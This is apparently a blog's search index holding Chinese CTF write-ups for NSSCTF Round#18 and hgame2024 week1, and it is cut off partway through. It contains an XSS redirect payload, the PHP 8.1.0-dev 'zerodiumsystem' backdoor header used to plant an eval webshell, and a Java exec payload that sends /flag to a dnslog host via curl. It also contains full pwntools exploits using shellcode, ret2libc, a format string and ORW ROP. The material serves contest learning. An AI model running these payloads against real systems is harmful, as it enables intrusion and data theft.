<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NSSCTF Round#18 Basic WP</title>
      <link href="/NSSCTF_Round18_Basic/"/>
      <url>/NSSCTF_Round18_Basic/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="门酱想玩什么呢？"><a href="#门酱想玩什么呢？" class="headerlink" title="门酱想玩什么呢？"></a>门酱想玩什么呢？</h2><p>查看源码，可以得到<code>king.php</code>和<code>nssctfroundSpring.php</code>。</p><p>查看<code>nssctfroundSpring.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">//部分关键代码</span></span><br><span class="line"><span class="variable">$contentLines</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$comment</span>[<span class="string">&#x27;content&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/\S+$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^https?:\/\/[^\/]+\/\S+\.png$/&#x27;</span>, <span class="variable">$contentLines</span>[<span class="number">0</span>], <span class="variable">$matches</span>) &amp;&amp; <span class="title function_ invoke__">end</span>(<span class="variable">$contentLines</span>) === <span class="string">&#x27;/png&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$urlParts</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$urlParts</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;img class=&quot;content&quot; src=&quot;&#x27;</span> . <span class="variable">$matches</span>[<span class="number">0</span>] . <span class="string">&#x27;&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="comment">//.......</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//......</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<code>king.php</code>，点击评论区。</p><p><img src="/./NSSCTF_Round18_Basic/w_1_1.png"></p><p>通过这里，可以猜测到<code>nssctfroundSpring.php</code>里给的源码是关于评论发布的，经过一些测试，可以确定插入图片的url对应 <code>$matches[0]</code>，可以xss。</p><p>本地测试一下</p><p><img src="/./NSSCTF_Round18_Basic/w_1_2.png"></p><p>成功弹窗。</p><p>观察url</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:28494/words/?title=MTIzMTIz&amp;content=aHR0cCUzQSUyRiUyRnh4eC54eHgueHh4JTJGJTIyJTNFJTNDc2NyaXB0JTNFYWxlcnQoJTJGeHNzJTJGKSUzQyUyRnNjcmlwdCUzRSUyMy5wbmclMjAlMkZwbmc%3D</span><br></pre></td></tr></table></figure><p>把<code>content</code>部分base64解码一次再url解码一次，可以得到刚刚输入的图片评论。</p><p>之后构造一个访问 元梦之星 官网的xss。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://xxx.xxx.xxx/&quot;&gt;&lt;script&gt;document.location=&quot;https://ymzx.qq.com/&quot;&lt;/script&gt;#.png /png</span><br></pre></td></tr></table></figure><p><img src="/./NSSCTF_Round18_Basic/w_1_3.png"></p><p>本地成功跳转到 元梦之星。</p><p>之后把这个链接给门酱就行了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://node1.anna.nssctf.cn:28494/words/?title=MTIzMTIz&amp;content=aHR0cCUzQSUyRiUyRnh4eC54eHgueHh4JTJGJTIyJTNFJTNDc2NyaXB0JTNFZG9jdW1lbnQubG9jYXRpb24lM0QlMjJodHRwcyUzQSUyRiUyRnltengucXEuY29tJTJGJTIyJTNDJTJGc2NyaXB0JTNFJTIzLnBuZyUyMCUyRnBuZw==</span><br></pre></td></tr></table></figure><p><img src="/./NSSCTF_Round18_Basic/w_1_4.png"></p><h2 id="Becomeroot"><a href="#Becomeroot" class="headerlink" title="Becomeroot"></a>Becomeroot</h2><p>首页可以知道<code>PHP Version 8.1.0-dev</code></p><p>这个版本的php可以rce，参考链接：<a href="https://cloud.tencent.com/developer/article/1839234">PHP 8.1.0-dev 后门远程命令执行漏洞复现</a></p><p>用echo写马方便接下来操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># header</span><br><span class="line">User-Agentt: zerodiumsystem(&quot;echo &#x27;&lt;?php eval(\$_POST[1])?&gt;&#x27;&gt;/var/www/html/1.php&quot;);</span><br></pre></td></tr></table></figure><p>蚁剑链接</p><p><img src="/./NSSCTF_Round18_Basic/w_2_1.png"></p><p>接下来是提权，脚本要去github找非交互式的POC</p><p>参考链接：<a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">CVE-2021-3156-plus</a></p><p>把脚本下载下来，上传到服务器并make，之后即可执行命令</p><p><img src="/./NSSCTF_Round18_Basic/w_2_2.png"></p><p>之后读<code>/root/fl0g000</code>即可得到flag。</p><p><img src="/./NSSCTF_Round18_Basic/w_2_3.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> NSSCTF Round </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame2024_week1 WP</title>
      <link href="/hgame2024_week1/"/>
      <url>/hgame2024_week1/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h2><p>这道题是猜的，没有把js代码看明白</p><p>js代码搜<code>won</code>，可以看到这里</p><p><img src="/./hgame2024_week1/w_1_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3</span><br></pre></td></tr></table></figure><p>这个字符串的长度是65，且没有重复的字符，这里我猜一手是base64码表。</p><p>根据这个码表，从flag头找flag。</p><p>先是用<code>hgame</code>头来找，取出<code>hga</code>用变表的base64加密得到<code>hoD8</code>，然后全局搜，发现没有。</p><p>接着尝试<code>flag</code>头，用<code>fla</code>进行base64加密得到<code>I7R8</code>，全局搜得到以下结果</p><p><img src="/./hgame2024_week1/w_1_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I7R8ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK</span><br></pre></td></tr></table></figure><p>把这串字符串用变表的base64解码，即可得到flag</p><p><img src="/./hgame2024_week1/w_1_3.png"></p><h2 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h2><p>这道题注册一个账号登录成功即可。</p><p>进入题目来到<code>login.html</code>，先禁用js，点击注册，来到<code>register_page.php</code>页面。</p><p>之后打开js，随便注册一个账号。</p><p><img src="/./hgame2024_week1/w_2_1.png"></p><p>用刚刚注册的账号登录成功后，点击<code>[~Click here~]</code>即可得到flag。</p><p><img src="/./hgame2024_week1/w_2_2.png"></p><h2 id="jhat"><a href="#jhat" class="headerlink" title="jhat"></a>jhat</h2><p>参考这篇文章：<a href="https://chenxuuu.github.io/wooyun_articles/drops/OQL(%E5%AF%B9%E8%B1%A1%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80)%E5%9C%A8%E4%BA%A7%E5%93%81%E5%AE%9E%E7%8E%B0%E4%B8%AD%E9%80%A0%E6%88%90%E7%9A%84RCE(Object%20Injection).html">OQL(对象查询语言)在产品实现中造成的RCE(Object Injection)</a></p><p>在<code>[Execute Object Query Language (OQL) query]</code>可以直接执行java代码，通过dnslog外带即可得到flag。</p><p><img src="/./hgame2024_week1/w_3_1.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java.lang.Runtime.getRuntime().exec(&quot;bashKKK-cKKK&#123;echo,Y3VybCBgY2F0IC9mbGFnYC5kZjE1YXUuZG5zbG9nLmNu&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;.split(&quot;KKK&quot;))</span><br></pre></td></tr></table></figure><p>这里利用<code>split</code>将字符串变成字符数组，<code>echo</code>后边的base64编码里的内容是我们要执行的命令，这里我执行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl `cat /flag`.df15au.dnslog.cn</span><br></pre></td></tr></table></figure><p>之后在<code>dnslog</code>可以查看到flag。</p><p><img src="/./hgame2024_week1/w_3_2.png"></p><p>补上花括号即可。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hgame&#123;a90f6f3fde61e38f2c21b82de9c04e5702f1eaad&#125;</span><br></pre></td></tr></table></figure><h2 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h2><p>考察的是http头，按照要求添加对应的http头即可。</p><p>这里需要注意的是，伪造本地并不是只有<code>X-Forwarded-For</code>，下面这些都可以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">X-Forwarded:127.0.0.1</span><br><span class="line">Forwarded-For:127.0.0.1</span><br><span class="line">Forwarded:127.0.0.1</span><br><span class="line">X-Forwarded-Host:127.0.0.1</span><br><span class="line">X-remote-IP:127.0.0.1</span><br><span class="line">X-remote-addr:127.0.0.1</span><br><span class="line">True-Client-IP:127.0.0.1</span><br><span class="line">X-Client-IP:127.0.0.1</span><br><span class="line">Client-IP:127.0.0.1</span><br><span class="line">X-Real-IP:127.0.0.1</span><br><span class="line">Ali-CDN-Real-IP:127.0.0.1</span><br><span class="line">Cdn-Src-Ip:127.0.0.1</span><br><span class="line">Cdn-Real-Ip:127.0.0.1</span><br><span class="line">CF-Connecting-IP:127.0.0.1</span><br><span class="line">X-Cluster-Client-IP:127.0.0.1</span><br><span class="line">WL-Proxy-Client-IP:127.0.0.1</span><br><span class="line">Proxy-Client-IP:127.0.0.1</span><br><span class="line">Fastly-Client-Ip:127.0.0.1</span><br><span class="line">True-Client-Ip:127.0.0.1</span><br></pre></td></tr></table></figure><p>这个题就用了<code>X-Real-IP</code>来伪造本地。</p><p><img src="/./hgame2024_week1/w_4_1.png"></p><p>最后在返回的头中得到一串<code>jwt</code>，用 <a href="https://jwt.io/">jwt.io</a> 解码即可得到flag。</p><p><img src="/./hgame2024_week1/w_4_2.png"></p><h2 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h2><p>莫名奇妙就出了，很怪。</p><p>抓包，抓一个选课的包，然后去爆破重复发，等等就有flag了。</p><p><img src="/./hgame2024_week1/w_5_1.png"></p><p>爆破设置选择数值，爆破位置选择<code>User-Agent</code>的任意一个字符。</p><p><img src="/./hgame2024_week1/w_5_2.png"></p><p><code>id</code>从<code>1-5</code>都发一次，爆破结束后访问<code>/api/ok</code>就能得到flag了。</p><p><img src="/./hgame2024_week1/w_5_3.png"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="EzSignIn"><a href="#EzSignIn" class="headerlink" title="EzSignIn"></a>EzSignIn</h2><p>nc即可得到flag。</p><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>先ida分析</p><p><img src="/./hgame2024_week1/p_2_1.png"></p><p>这里要求输入的数字要小于10，注意以下这里的<code>v4</code>是有符号的int。</p><p>查看<code>myread</code>函数</p><p><img src="/./hgame2024_week1/p_2_2.png"></p><p>注意以下形参的<code>a2</code>是无符号的int，也就是传进来的<code>v4</code>会转成无符号的<code>a1</code>，因此在这里<code>v4</code>传入一个负数绕过主函数的判断。</p><p>接着是对shellcode的检查要求是字母+数字，去网上抄一条就行了。</p><p>参考链接：<a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">[BUUCTF]PWN——mrctf2020_shellcode_revenge（可见字符shellcode）</a></p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">p=remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31592</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;input the length of your shellcode:&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;input your shellcode:&quot;</span>,shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_2_3.png"></p><h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>ida分析</p><p><img src="/./hgame2024_week1/p_3_1.png"></p><p><code>seed</code>取的是当前时间，之后是99次的随机数判断，然后就是<code>myread</code>函数。</p><p><img src="/./hgame2024_week1/p_3_2.png"></p><p><code>myread</code>函数存在栈溢出，没有后门，用libc打。</p><p>先走到<code>myread</code>，第一次溢出泄露出<code>puts</code>的地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.100.137.175&#x27;</span>, <span class="number">32019</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401423</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">myread = <span class="number">0x40125D</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span></span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;thy name.\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    v6 = (libc.rand() % <span class="number">100</span>) + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;the number:\n&#x27;</span>,p32(v6))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(myread)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;thy brilliant mind.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>,puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>,puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>,puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">4</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x7f2160359420</span></span><br></pre></td></tr></table></figure><p>泄露出<code>puts</code>的地址后3位为<code>420</code>。</p><p>通过 <a href="https://libc.blukat.me/">libc database search</a> 查找<code>puts</code>、  <code>system</code> 和 <code>/bin/sh</code> 的地址。</p><p><img src="/./hgame2024_week1/p_3_3.png"></p><p>根据<code>puts</code>的地址算出<code>libc</code>的基地址，在第二次栈溢出时<code>getshell</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./vuln&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.100.137.175&#x27;</span>, <span class="number">30915</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x401423</span></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">main_addr = <span class="number">0x40125D</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span></span><br><span class="line">libc.srand(<span class="built_in">int</span>(time.time()))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;thy name.\n&#x27;</span>,name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">99</span>):</span><br><span class="line">    v6 = (libc.rand() % <span class="number">100</span>) + <span class="number">1</span></span><br><span class="line">    p.sendafter(<span class="string">b&#x27;the number:\n&#x27;</span>,p32(v6))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)+p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line"><span class="comment"># 泄露地址</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;thy brilliant mind.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(0,p.recvline())  #p.recvuntil(&#x27;\x0a&#x27;)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">1</span>,puts_addr)</span><br><span class="line">puts_addr = puts_addr.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">2</span>,puts_addr)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="comment">#puts_addr = u64(p.recv(6).ljust(8, b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">3</span>,puts_addr)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">4</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># getshell</span></span><br><span class="line">sys_offset = <span class="number">0x052290</span></span><br><span class="line">puts_offset = <span class="number">0x084420</span></span><br><span class="line">sh_offset = <span class="number">0x1b45bd</span></span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">binsh = libc_base + sh_offset</span><br><span class="line">system = libc_base + sys_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">48</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">payload += p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_3_4.png"></p><h2 id="ezfmt-string"><a href="#ezfmt-string" class="headerlink" title="ezfmt string"></a>ezfmt string</h2><p>只有一次的格式化字符串</p><p><img src="/./hgame2024_week1/p_4_1.png"></p><p><code>vuln</code>函数存在格式化字符串，存在后门函数。</p><p>格式化字符串能够修改任意地址，这里我用了栈迁移的方法实现对后门函数的调用。</p><p>参考链接：<a href="https://blog.csdn.net/Kata_Jhin/article/details/130678623">栈迁移（leave ret）（更适合pwn宝宝体质的栈迁移~）</a></p><p>经过测试，old ebp在第18个位置，修改这个地址，然后在栈里面写入<code>sys</code>的地址。</p><p>exp需要多跑几次，概率能通</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./vuln&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.100.137.175&quot;</span>,<span class="number">31349</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;%72c%18$hhnaaaaa&#x27;</span>+p64(<span class="number">0x40123D</span>)*<span class="number">6</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;M3?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_4_2.png"></p><h2 id="Elden-Ring-Ⅰ"><a href="#Elden-Ring-Ⅰ" class="headerlink" title="Elden Ring Ⅰ"></a>Elden Ring Ⅰ</h2><p>参考：<a href="https://blog.csdn.net/Mr_Fmnwon/article/details/135709318">【PWN · ORW | 栈迁移 | ROP】[HGAME 2023 week1]orw</a></p><p>不能说完全相同，只能说exp一模一样（</p><p>改一下<code>vuln</code> 和<code>rsi</code>的地址即可。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p64,u64</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">vuln=<span class="number">0x40125B</span></span><br><span class="line">rdi=<span class="number">0x4013e3</span></span><br><span class="line"><span class="comment">#io=process(&#x27;./vuln&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;47.100.245.185&#x27;</span>,<span class="number">30321</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### leak_libc</span></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(vuln)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;I offer you an accord.\n&#x27;</span>,payload)</span><br><span class="line">puts_real=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts_real:&#x27;</span>+<span class="built_in">hex</span>(puts_real))</span><br><span class="line">libc_base=puts_real-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">### read_bss</span></span><br><span class="line">bss_base=elf.bss()</span><br><span class="line"><span class="comment"># read(int fd, void *buf, size_t count);</span></span><br><span class="line">read_real=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">fd=<span class="number">0</span></span><br><span class="line">buf=bss_base+<span class="number">0x100</span></span><br><span class="line">count=<span class="number">0x200</span></span><br><span class="line">rdi=libc_base+<span class="number">0x23b6a</span></span><br><span class="line">rsi=libc_base+<span class="number">0x2601f</span></span><br><span class="line">rdx=libc_base+<span class="number">0x142c92</span></span><br><span class="line">rsp=libc_base+<span class="number">0x2f70a</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+p64(rsi)+p64(buf)+p64(read_real)+p64(rsp)+p64(buf+<span class="number">8</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">### rop-&gt;bss</span></span><br><span class="line">payload=<span class="string">b&#x27;/flag&#x27;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># open(const char *pathname, int flags)</span></span><br><span class="line">open_real=libc_base+libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">pathname_ptr=buf</span><br><span class="line">flags=<span class="number">0</span></span><br><span class="line">payload+=p64(rdi)+p64(pathname_ptr)+p64(rsi)+p64(flags)+p64(open_real)</span><br><span class="line"><span class="comment"># read(int fd, void *buf, size_t count);</span></span><br><span class="line">fd=<span class="number">3</span></span><br><span class="line">buf2=buf+<span class="number">0x300</span></span><br><span class="line">count=<span class="number">0x100</span></span><br><span class="line">payload+=p64(rdi)+p64(fd)+p64(rsi)+p64(buf2)+p64(rdx)+p64(count)+p64(read_real)</span><br><span class="line"><span class="comment"># write(int handle,void* buf,int length)</span></span><br><span class="line">write_real=libc_base+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">handle=<span class="number">1</span></span><br><span class="line">buf3=buf2</span><br><span class="line">length=<span class="number">0x50</span></span><br><span class="line">payload+=p64(rdi)+p64(handle)+p64(rsi)+p64(buf3)+p64(rdx)+p64(length)+p64(write_real)+p64(vuln)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"> </span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week1/p_5_1.png"></p><h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="ezIDA"><a href="#ezIDA" class="headerlink" title="ezIDA"></a>ezIDA</h2><p>ida打开即可得到flag。</p><p><img src="/./hgame2024_week1/r_1_1.png"></p><h2 id="ezASM"><a href="#ezASM" class="headerlink" title="ezASM"></a>ezASM</h2><p>让gpt把汇编转成c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> c[] = &#123;<span class="number">74</span>, <span class="number">69</span>, <span class="number">67</span>, <span class="number">79</span>, <span class="number">71</span>, <span class="number">89</span>, <span class="number">99</span>, <span class="number">113</span>, <span class="number">111</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">81</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">79</span>, <span class="number">82</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">86</span>, <span class="number">22</span>, <span class="number">76</span>, <span class="number">86</span>, <span class="number">125</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">112</span>, <span class="number">71</span>, <span class="number">84</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">81</span>, <span class="number">17</span>, <span class="number">95</span>, <span class="number">34</span>&#125;;</span><br><span class="line"><span class="type">char</span> flag[<span class="number">33</span>];</span><br><span class="line"><span class="type">char</span> format[] = <span class="string">&quot;plz input your flag: &quot;</span>;</span><br><span class="line"><span class="type">char</span> success[] = <span class="string">&quot;Congratulations!&quot;</span>;</span><br><span class="line"><span class="type">char</span> failure[] = <span class="string">&quot;Sry, plz try again&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Print prompt</span></span><br><span class="line">    write(<span 